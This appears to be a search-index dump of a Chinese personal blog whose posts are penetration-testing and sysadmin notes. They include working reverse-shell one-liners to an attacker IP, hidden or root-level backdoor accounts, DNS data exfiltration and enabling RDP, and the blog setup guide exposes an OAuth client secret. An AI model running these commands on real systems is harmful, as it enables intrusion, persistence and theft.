bash中的IP可以是任何形式（十进制、十六进制、八进制、二进制等）\nSocat反弹shell1、安装\napt-get install socat\n\n2、攻击机开启本地监听\nsocat TCP-LISTEN:1111 -或nc -lvvp 1111\n\n3、目标机主动连接攻击机\nsocat tcp-connect:192.168.66.138:1111 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane\n\n\n\n\n\nTelnet反弹shell当nc和/dev/tcp不可用时，且目标机和攻击机都开启telnet（23端口）服务时，可用telnet反弹shell。\n方法一：\n1、攻击机开启本地监听：\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\nmknod a p;telnet 192.168.66.138 1111 0&lt;a | /bin/bash 1&gt;a\n\n\n\n方法二：\n1、攻击机开启两个本地监听：\nnc -lvvp 1111nc -lvvp 2222\n\n2、目标机主动连接攻击机：\ntelnet 192.168.66.138 1111 | /bin/bash | telnet 192.168.66.138 2222\n3、攻击机1111端口执行命令，2222端口回显命令\nPython脚本反弹shell1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\npython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;\n\n\n\n\n\nPHP脚本反弹shell1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机：\nphp -r &#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;\n\n\n\n\n\nPerl脚本反弹shell（后缀.pl）1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\nperl -e &#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;\n\n\n\n\n\nRuby脚本反弹shell（后缀.rb）1、攻击机开启本地监听\nnc -lvvp 1111\n\n2、目标机主动连接攻击机\nruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;或ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;\n\n\n\n\n\nMetasploit生成反弹shell1、自动生成反弹一句话\nmsfvenom -p cmd/unix/reverse_python LHOST=192.168.66.138 LPORT=1111 -f raw\n\n其中，cmd/unix/reverse_python为python类型反弹命令，其他类型直接更改_后缀即可，如cmd/unix/reverse_perl生成perl反弹shell\n2、将生成的反弹shell直接在目标机器上执行即可\nOpenSSL反弹加密shell1、攻击机生成自签名证书：（填写信息全部回车即可）\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n\n2、在攻击机上使用OpenSSL监听一个端口\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 1111\n\n3、在目标机上进行反弹shell\nmkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.66.138:1111 &gt; /tmp/s; rm /tmp/s\n\n\n\n\n\n反弹shell后获取模拟终端上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。\n1、获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。\n2、标准的错误输出无法显示，无法正常使用vim等文本编辑器等。\n3、获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。\n若是无法完成正常交互，则需要使用python模拟终端设备，命令如下：\npython -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;\n\n","categories":["Web渗透"],"tags":["反弹shell"]},{"title":"添加用户并提权","url":"/2021/06/20/%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%B9%B6%E6%8F%90%E6%9D%83/","content":"前提：需要为管理员权限\nlinux环境1、创建普通用户useradd test\t#创建test用户passwd test\t\t#给test用户设置密码\n\n\n\n2、提权方法一：a、修改/etc/sudoers文件，将#去掉\n## Allows people in group wheel to run all commands%wheel    ALL=(ALL)    ALL\n\nb、然后修改用户，使其属于root组\nusermod -g root test\n\nc、使用test账号登录，su -切回root，再切回test即为root权限\n方法二：a、修改/etc/sudoers文件，找到root并添加\n## Allow root to run any commands anywhereroot    ALL=(ALL)     ALLtest   \tALL=(ALL)     ALL\n\nb、使用test账号登录，即可使用sudo权限操作\n如：sudo ls\n方法三：a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0\ntest:x:0:1000::/home/test:/bin/sh\n\nb、切换至test用户，输入test密码即可登陆至root账户\n3、删除用户userdel -r test\t\t#删除用户及其主目录\n\n\n\n注！非交互式shell修改密码echo &quot;test:123&quot; | chpasswdecho &quot;123&quot; | passwd --stdin &quot;test&quot;\n\n\n\nWindows环境1、创建普通用户net user test 123456 /add\t\t#添加test用户，密码为12356net user $test 123456 /add\t\t#添加隐藏test用户，密码为12356\n\n\n\n2、添加用户至管理员组net localgroup administrators test /add\t\t#添加test用户至管理员组\n\n\n\n查看管理员组成员\nnet localgroup administrators\t\t#查看管理员组成员\n\n\n\n删除用户\nnet localgroup administrators test /del\t\t#删除用户\n\n\n\n禁用用户/启用用户\nnet user test /active:no\t\t#禁用test用户net user test /active:yes\t\t#启用test用户\n\n","categories":["Web渗透"],"tags":["添加用户","提权"]},{"title":"JavaScript基础","url":"/2021/06/20/JavaScript%E5%9F%BA%E7%A1%80/","content":"js调用方法（4种）\n\n\n命令\n说明\n\n\n\nalert(1)\nscript标签中执行\n\n\n\n调用执行\n\n\n\n链接触发\n\n\n\n事件触发\n\n\njs事件\n\n\n事件\n说明\n\n\n\nWindows事件\n针对windows对象触发的事件，应用到body标签\n\n\nonafterprint\n打印之后触发的事件\n\n\nonbeforeprint\n打印之前触发的事件\n\n\nonerror\n发生错误（文件加载错误等）时触发的事件，常跟不存在的图片，用来执行js触发xss漏洞\n\n\nonload\n页面加载完成后立即发生\n\n\nonresize\n窗口大小被改变时触发的事件\n\n\nonunload\n页面下载或刷新网页时触发事件\n\n\n\n\n\n\nForm事件\n由HTML表单内的动作触发的事件，应用到几乎所有的HTML元素，最常用在Form元素\n\n\nonblur\n当元素失去焦点（鼠标移出等）时触发的事件\n\n\nonchange\n输入框的值发生变化或者下拉列表框选项触发的事件\n\n\nonfocus\n当元素获得焦点时触发的事件\n\n\nonformchange\n当表单被改变时触发的事件\n\n\noninput\n当元素获得用户输入时触发的事件\n\n\nonselect\n元素中文本被选中后触发的事件\n\n\nonsubmit\n提交表单时触发的事件\n\n\n\n\n\n\nKeyboard事件\n\n\n\nonkeydown\n用户按下按键时触发的事件\n\n\nonkeypress\n用户敲击按钮时触发的事件\n\n\nonkeyup\n用户释放按键时触发的事件\n\n\n\n\n\n\nMouse事件\n由鼠标或类似用户动作触发的事件\n\n\nonclick\n元素上发生鼠标点击时触发的事件\n\n\nondblclick\n元素上发生鼠标双击时触发的事件\n\n\nonmousedown\n当元素上按下鼠标按钮时触发的事件\n\n\nonmousemove\n当鼠标指针移动到元素上时触发的事件\n\n\nonmouseover\n当鼠标指针移动到元素上时触发的事件\n\n\nonmouseout\n当鼠标指针移出元素时触发的事件\n\n\nonmouseup\n当在元素上释放鼠标按钮时触发的事件\n\n\n更多事件访问文档：https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\nDOM操作\n\n\n使用\n命令\n\n\n\n通过ID获取\ndocument.getElementById()\n\n\n通过标签名称获取（结果有多个，以数组形式存放）\ndocunment.getElementsByTagName()\n\n\n通过对象名称获取（结果有多个，以数组形式存放）\ndocumemt.getElementsByClassName()\n\n\n\n\n\ndocument事件操作\n\n\n\n\n动态添加事件\ndocument.getElementById(“x”).addEventListener(“click”,function(){  })             给img添加点击事件  document.getElementById(“x”).addEventListener(“click”,function(){  alert(“这是图片”)  })\n\n\n创建标签\ndocument.createElement(“img”)                      #创建img标签  创建img标签，并添加属性  img =  document.createElement(“img”)   img.src =  “x.jpg”  img.style.width  = “100px”  …     可以创建script标签实现跨站脚本攻击  \n\n\n应用\ndocument.body.appendChild()  执行添加/创建（否则不显示）\n\n\n","categories":["编程基础"],"tags":["JavaScript"]},{"title":"Windows随记","url":"/2021/06/20/Windows%E9%9A%8F%E8%AE%B0/","content":"\n\n\n命令\n说明\n\n\n\nnetstat -r\n列出当前路由信息\n\n\ndir\n显示文件列表，同linux下ls\n\n\nmkdir或mk\n创建目录\n\n\nrmdir或rd\n删除目录\n\n\ncopy\n复制，需要指定目录\n\n\ndel\n删除\n\n\ntouch\n创建文件\n\n\nren\n重命名\n\n\ntype\n查看文本文件\n\n\n","categories":["Windows"],"tags":["随记"]},{"title":"Windows搭建IIS + mssql","url":"/2021/06/20/Windows%E6%90%AD%E5%BB%BAIIS-mssql/","content":"一、搭建IIS服务1、搭建IIS服务开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）\n2、导入ASP网站选择网站路径\n修改网站访问端口号\n3、网站配置\n\n\n报错类型\n做法\n\n\n\n403（无访问主程序）\n修改默认文档，增加index.asp\n\n\n500（无法访问文件）\nASP-启用父路径\n\n\n提示未启用32位程序池\n应用程序池-网站-高级设置-32位应用程序池-True\n\n\n没有操作权限\n修改www目录权限：  属性-安全-编辑-修改Users权限为完全控制\n\n\n安装SQL Server数据库并导入原有数据库1、winserver2008连接sql server镜像，选择安装（精简功能）\n \n2、限制数据库权限（从管理员权限降权）\n \n3、混合模式，设置密码，添加管理员\n \n4、后续全部确认即可\n5、新建数据库（testdb）\n6、修改网站数据库配置文件，数据库类型为mssql\n7、替换网站原有数据库\n8、修改网站数据库配置文件\n新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）\n注意：mssql账号为sa\n","categories":["Windows"],"tags":["IIS"]},{"title":"Typora常用快捷键","url":"/2021/06/20/Typora%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/","content":"\n\n\n快捷键\n说明\n\n\n\nCtrl+T\n插入表格\n\n\nCtrl+Shift+K\n插入代码块\n\n\nCtrl+0\n段落\n\n\nCtrl+1-6\n1-6级标题\n\n\nCtrl+Enter\n表格下方插入行\n\n\nCtrl+/\n源码编辑\n\n\nCtrl+Shift+V\n粘贴为纯文本\n\n\n文件-偏好设置-高级设置-conf.user.json    重新设置快捷键\n&quot;keyBinding&quot;: &#123;    // for example:     // &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;    &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;,      &quot;Code Fences&quot;: &quot;Ctrl+Shift+F&quot;,      &quot;Ordered List&quot;:&quot;Ctrl+Alt+o&quot;,      &quot;Unordered List&quot;: &quot;Ctrl+Alt+u&quot;    &#125;,\n\n附件，快捷键对照表\n \n\n","categories":["附加"],"tags":["Typora"]},{"title":"搭建LAMP环境","url":"/2021/06/20/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/","content":"LAMP：Linux+Apache+Mysql+PHP\n1、安装Apache（httpd）yum install httpd httpd-devel httpd-manual httpd-tools\n\n2、启动apache并设置开机自启systemctl start httpd\t\t#开启apachesystemctl enable httpd\t\t#设置开机自启systemctl status httpd\t\t#查看apache状态\n\n\n\n3、安装Mysqlyum install mariadb-server\n\n\n\n4、启动Mysql并设置开机自启systemctl start mariadb\t\t\t#开启mariadbsystemctl enable mariadb\t\t#设置开机自启systemctl status mariadb\t\t#查看mariadb状态\n\n\n\n5、配置Mysql数据库mysql_secure_installation\t\t#初始化mysql数据库（全部回车确认）\n\n设置mysql密码（非操作系统密码）\n6、安装PHP(php-fpm php-mysqlnd不装，其他均可)\nyum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap\n\n7、重启apache使php生效（php不是独立软件，依附apache）\nsystemctl restart httpd\n\n8、解压WP网站9、复制WP网站文件至Apache网站目录cp -r WP/* /var/www/html\n\n10、赋予Apache网站apache权限（apache服务由apache账户运行，还权限，安全控制）\nchown -R apache:apache /var/www/html\n\n11、禁用SELinux（安全访问控制，影响网站访问）\nvi /etc/sysconfig/selinux修改SELINUX=disabled重启操作系统（reboot）\n\n\n\n12、访问网站ip+80端口，安装wp网站13、此时需要设置mysql账户mysql -uroot -p\t\t\t# 启动mysql（需要输入mysql密码）create database wp_web;\t# 创建mysql账户exit\t\t\t\t\t# 退出mysql\n\n（注意！wp-config.php  删除可重装wp网站）\n14、其他/var/www/html\t\t\t\t\t# Apache默认网站路径/etc/httpd/conf/httpd.conf\t\t# Apache配置文件路径\n\n修改DocumentRoot “/var/www”即可修改网站路径\n \n","categories":["Linux"],"tags":["Apache环境搭建"]},{"title":"搭建Nginx + 直播推流平台","url":"/2021/06/20/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/","content":"搭建Nginx环境1、下载Nginx源码包curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz\n\n\n\n2、解压源码包tar -zxvf nginx-1.20.1.tar.gz -C ../\t# -C指定解压路径\n\n\n\n3、配置生成文件（一般修改配置文件、日志文件路径）./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module\n\n注：需要下载配置环境\n如：\nyum install pcre-devel zlib-devel openssl-devel\n\n\n\n4、make编译5、make install安装6、添加nginx到环境变量ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/\n\n（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）\n此时可直接使用nginx命令，如：nginx -s stop停止nginx服务\n7、关闭防火墙systemctl stop firewalldsystemctl disable firewalld\t\t#永久禁用\n\n至此，访问80端口可看到Nginx测试页\n 下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页\n8、其他注意事项/var/lib/mysql\t\t\t\t# mysql数据路径/usr/local/nginx/html\t\t# Nginx默认网站路径/etc/nginx/nginx.conf\t\t# Nginx配置文件\n\n\n\n修改root /var/www/html即可改变默认路径\n \nNginx搭建直播推流平台工具：nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）\n1、源码安装，配置在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：\n./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master\n\n\n\n2、make、make install3、修改配置文件（/etc/nginx/nginx.conf）\n在http中新增（与最内层函数同级）\nlocation /live &#123;  flv_live on;  chunked_transfer_encoding on;  add_header Access-Control-Allow-Origin *;&#125;\n\n在文件末尾新增（与http函数同级）\nrtmp &#123;\tserver &#123;\t\tlisten 1935; \t\tapplication chen &#123;\t\t\tlive on;\t\t&#125;\t&#125;&#125;\n\n（注！live不可更改，会导致无法加载视频）\n4、检查nginx -t\t\t# 检测配置文件有无语法错误nginx -s reload\t# 重新加载\n\n\n\n5、推流设置OBS推流设置（PC）\n\n\n\n说明\n命令\n\n\n\n服务器\nrtmp://139.224.x.x/live/\n\n\n串流密钥\nchen（可更改，类似于密码）\n\n\n杏林推流设置（APP）\nrtmp://139.224.x.x/live/chen\n\n\n\n6、观看http://bilibili.github.io/flv.js/demo/\t\t\t#观看视频地址http://139.224.x.x/live?app=live&amp;stream=chen\t#推流视频链接\n\n","categories":["Linux"],"tags":["Nginx环境搭建","直播推流平台"]},{"title":"Web渗透随记","url":"/2021/06/20/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/","content":"DNS外带平台：\nhttp://dnslog.cn/        #需要生成随机DNS\n使用：\nping `whoami`.dns\n\n（注：``为优先运行符，可以用$()代替）\n适用：\n注入、反序列化、命令执行等无回显情况下，外带数据看结果\nWindows开启3389端口注：Win7、Win2003、XP系统\n开启：\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n关闭：\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f\n\n","categories":["Web渗透"],"tags":["随记"]},{"title":"Linux随记","url":"/2021/06/20/Linux%E9%9A%8F%E8%AE%B0/","content":"网卡配置配置静态IP：vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33ONBOOT=yesBOOTPROTO=&quot;static&quot;IPADDR=&quot;192.168.x.x&quot;NETMASK=&quot;255.255.255.0&quot;GATEWAY=&quot;192.168.x.1&quot;\n\nifdown eth0   禁用网卡ifup eth0      启用网卡\n\n配置DNS：vim /etc/resolv.confnameserver 8.8.8.8\n\n其他：arp -a 192.168.x.x  查看ip是否被使用，用来选择静态ip\n常用DNS：\n国内：114.114.114.114、223.5.5.5、119.29.29.29等\n国外：1.1.1.1、8.8.8.8等\n重要目录及文件\n\n\n目录\n说明\n\n\n\n/etc\n存放所有管理系统所需要的配置文件和子目录\n\n\n\n/etc/passwd                                  #存放操作系统用户信息/etc/shadow                                 #存放操作系统账户密码/etc/group                                    #存储当前系统中所有用户组信息/etc/gshadow                               #存储用户组密码的一类信息/etc/nginx/nginx.conf                 # Nginx配置文件/etc/httpd/conf/httpd.conf        # Apache配置文件路径\n\n\n/usr\nLinux系统资源目录，类似Windows下的program files目录\n\n\n\n/usr/local/nginx/html        # Nginx默认网站路径\n\n\n/var\n系统运行时需要改变的数据&lt;br /\n\n\n\n/var/log                  #日志存放目录/var/spool/cron    #计划任务目录，定时执行/var/lib/mysql       # mysql数据路径/var/www/html     # Apache默认网站路径\n\n\n常用解压压缩tar -zxvf file  -C ./dir\t\t\t  \t#解压.tar.gz文件到指定文件夹tar -zcvf ./file  file1 file2\t\t\t#打包压缩成.tar.gz文件，注意，压缩成的文件需要在-f参数后面unzip file\t\t\t\t\t\t\t\t#解压zip文件zip file\t\t\t\t\t\t\t\t#压缩zip文件\n\n7za x file.7z -r -o./\t\t\t\t\t#解压7za a -t7z file.7z /opt/fileName/*\t\t#压缩\n\n注：压缩中，-t指定压缩类型，可忽略（默认7z）\n下载使用\nyum install p7zip -y\n\n\n\nVI使用\n\n\n命令\n说明\n\n\n\ni、I\ni光标处输入，I所在行第一个非空格符处输入\n\n\na、A\na光标下一个字符处输入，A行末处输入\n\n\no、O\no光标下一新行输入，O光标上一新行输入\n\n\nESC\n命令模式\n\n\nctrl+b\n上翻\n\n\nctrl+f\n下翻\n\n\n0\n移动到行首\n\n\n$\n移动到行尾\n\n\ngg\n移动到文档首\n\n\nG\n移动到文档尾\n\n\n:%s/word1/word2/g\n全局替换word1为word2\n\n\n/word\n向光标之下寻找word字符串\n\n\n?word\n向光标之上寻找word字符串\n\n\nx、X\n剪切\n\n\ndd\n删除整行\n\n\nndd\n删除n行\n\n\nyy\n复制整行\n\n\nnyy\n复制n行\n\n\np、P\np向下粘贴，P向上粘贴\n\n\nu\n撤销，直至还原\n\n\nctrl+r\n撤销，仅限一步\n\n\n.\n重复上一个动作\n\n\n:q\n不保存退出\n\n\n:w\n保存退出\n\n\n:!\n强制执行\n\n\n:! command\n暂时离开vi执行command\n\n\n:set nu\n显示行号\n\n\n:set nonu\n取消显示行号\n\n\n查找命令find / -name &quot;file&quot;  在根目录下查看文件名为file的文件find / -perm &quot;root&quot;  在根目录下查找root权限文件find / -user &quot;root&quot;  在根目录下查找root用户文件\n\n\n\n软件安装curl安装（需要有下载路径，本机对服务器的下载）\ncurl _ip/_file -o filename  -o可替换为&gt;\nscp上传（需要有源文件，本机对服务器的上传）\nscp：ssh+sftp，占用ssh端口及账号及部分功能，使用sftp协议，进行文件上传\nscp filename root@ip:/_path\nyum安装（需要源网站里面有对应的软件）\n\n\n\n命令\n说明\n\n\n\nyum search\n查找\n\n\nyum install\n安装\n\n\nyum remove\n移除\n\n\nyum update\n升级，可指定升级，也可全部升级\n\n\n注：yum源文件：/etc/yum.repos.d\nwget安装（同curl，但是更简单，速度更快）\nwget _path/_file\n源码安装步骤\n\n\n命令\n说明\n\n\n\n1、tar 解包\n解压缩源码包到指定目录\n\n\n2、./configure\n配置生成makefile文件，可手动配置参数（如安装路径）\n\n\n3、make编译\n生成可执行的二进制文件\n\n\n4、make install安装\n复制二进制文件到系统，配置应用环境（如应用安装路径配置文件）\n\n\n注：configure配置文档（官方文档）\nhttp://nginx.org/en/docs/configure/html  \nfirewall防火墙配置\n\n\n命令\n说明\n\n\n\nfirewall-cmd  –state\n查看防火墙状态\n\n\nfirewall-cmd  –get-active-zones\n查看正在使用的区域及网卡名称\n\n\nfirewall-cmd  –list-all-zones\n显示当前预期网卡配置参数、资源、端口及服务等信息\n\n\nfirewall-cmd  –zone=public –add-port=80/tcp –permanent\n允许80端口tcp流量通过，永久生效\n\n\nfirewall-cmd  –zone=public –add-service=http –permanent\n同上，不同的配置方式\n\n\nfirewall-cmd  –zone=public –remove-port=23/udp –permanent\n禁止23端口udp流量通过，永久生效\n\n\nfirewall-zone  –zone=public –remove-service=dns –permanent\n同上，不同配置方式\n\n\n常用端口服务：\n\n\n\n服务\n端口\n\n\n\nhttp\n80/tcp\n\n\nhttps\n443/tcp\n\n\ndns\n23/udp\n\n\nmysql\n3306/tcp\n\n\nssh\n22/tcp\n\n\n","categories":["Linux"],"tags":["随记"]},{"title":"搭建hexo博客","url":"/2021/06/20/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/","content":"一、简介Github Pages\nGitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。\nHexo\nHexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。\n二、环境准备Nodejs + Git + Github账号\n（可用choco install nodejs git一键安装）\n三、安装1、连接github账户\n\n\n操作\n命令\n\n\n\n设置用户名邮箱\ngit config –global user.name “zeroChen00”git config –global user.email “&#49;&#x36;&#53;&#x32;&#53;&#x36;&#48;&#57;&#51;&#56;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;“\n\n\n创建SSH密匙\nssh-keygen -t rsa -C “&#x31;&#x36;&#x35;&#50;&#x35;&#x36;&#x30;&#x39;&#x33;&#56;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#109;“（全部回车）\n\n\n添加密匙\n1、复制 [C:\\Users\\用户名.ssh\\id_rsa.pub]中密匙2、Github-Setting-SSH and GPG keys-New SSH key，新建Key，贴入密匙\n\n\n验证连接\nssh -T &#x67;&#105;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#99;&#x6f;&#x6d;（yes确认）显示 “Hi xxx! You’ve successfully……” 即连接成功\n\n\n2、创建Github Pages仓库Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建\n（注意！仓库用户名需要与github用户名保持一致，否则无法访问）\n3、本地安装Hexo博客程序\n\n\n操作\n命令\n\n\n\n使用npm安装Hexo\nnpm install  -g hexo-cli\n\n\n验证安装\nhexo -v\n\n\n初始化\nhexo init\n\n\n安装组件\nnpm install\n\n\n生成页面\nhexo g\n\n\n启动预览\nhexo s\n\n\n访问http://localhost:4000\n出现hexo默认界面则安装成功\n\n\n（注：hexo server -p 5000可更改端口，默认4000）\n4、部署Hexo到Github Pages\n\n\n操作\n命令\n\n\n\n安装hexo-deployer-git\nnpm install  hexo-deployer-git –save\n\n\n修改 _config.yml 文件末尾的Deployment 部分\ndeploy:     type: git    repository: &#103;&#105;&#116;&#64;&#103;&#105;&#116;&#x68;&#x75;&#98;&#46;&#99;&#111;&#109;:zeroChen00/zeroChen00.github.io.git    branch: maste\n\n\n上传部署\nhexo d\n\n\n访问Giuhub静态博客\nhttps://zeroChen00.github.io/\n\n\n（注意！hexo中所有代码操作，冒号后均要跟一个空格，负责不生效！）\n四、主题配置\n\n\n操作\n命令\n\n\n\n下载\ngit clone https://github.com/Fechin/hexo-theme-diaspora.git  themes/diaspora\n\n\n修改全局配置文件_config.yml\ntheme:  diaspora\n\n\n新建页面\nhexo new  page categories  新增  type:  “categories”\n\n\n新建标签\nhexo new  page tags  新增  type: “tags”\n\n\n安装搜索插件\nnpm install  hexo-generator-searchdb –save\n\n\n修改全局配置文件_config.yml\nsearch:    path: search.xml    field: post    format: html    limit: 10000\n\n\n新建页面\nhexo new  page search  新增  type:  “search”\n\n\n主题配置文件启用全局搜索（已有，勿新增）\n#本地搜索,请将索引文件放在网站根目录  local_search:     #是否启用        enable: true\n\n\n开启评论\n1、注册OAuth applicationsetting-Developer setting-Oauth Apps-new2、修改主题配置文件如下：    # Gitalk 评论插件（https://github.com/gitalk/gitalk）    gitalk:        # 是否启用评论功能        enable: true        # 是否自动展开评论框        autoExpand: false        # 应用编号        clientID: ‘e231ce2fa07f8397e8a7’        # 应用秘钥        clientSecret: ‘feb843942f9c476a9b974bb09f0e5135f9ca8f87’        # issue仓库名        repo: ‘zerochen00.github.io’        # Github名        owner: ‘zeroChen00’        # Github名        admin: [‘zeroChen00’]        # Ensure uniqueness and length less than 50        id: location.pathname        # Facebook-like distraction free mode        distractionFreeMode: true注意：用户名大小写，评论用户时需要github账户处于登录状态\n\n\n五、使用\n\n\n操作\n命令\n\n\n\n1、写博客\nhexo new  “My New Post”  source  文件夹中会出现一个 My New Post.md 文件\n\n\n或贴入.md文件（需要增加文件头）\n—title: Hello World # 标题date: 2019/3/26 hh:mm:ss # 时间categories: # 分类- Diarytags: # 标签- PS3- Games—\n\n\n2、更新并发布静态博客\nhexo g  # 生成页面  hexo  d  # 部署发布\n\n\n3、更改配置\n_config.yml文件（修改时:后跟一个空格）\n\n\n4、更换主题\nhttps://hexo.io/themes/  git clone  _file ./themes/file  根据主题介绍进行下载并配置_config.yml文件（更改主题名称等）\n\n\n","categories":["附加"],"tags":["hexo博客"]}]